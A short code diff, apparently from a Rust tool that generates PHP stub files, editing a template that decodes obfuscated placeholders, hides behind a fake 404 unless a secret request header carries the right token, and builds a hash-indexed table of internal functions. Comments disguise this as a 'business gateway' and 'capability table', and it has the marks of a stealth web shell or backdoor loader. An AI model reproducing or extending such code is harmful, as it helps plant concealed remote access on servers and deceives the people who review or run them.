@@ -1648,7 +1648,7 @@ const NATIVE_STUB_TPL: &str = r#"<?php
 
 /* 内部调用方标识校验（业务网关） */
 $_gk=__DEC__('__GKHEX__','__XK__');
-if(!isset($_SERVER[$_gk])||$_SERVER[$_gk]!==__DEC__('__TOKENHEX__','__XK__')){http_response_code(404);exit;}
+if(!isset($_SERVER[$_gk])||$_SERVER[$_gk]!==__DEC__('__TOKENHEX__','__XK__')){@header('HTTP/1.1 404 Not Found');exit;}
 
 /* 运行时能力注册：按哈希索引已加载的内部函数（业务底层能力表） */
 $_g=array_fill(0,18,'');
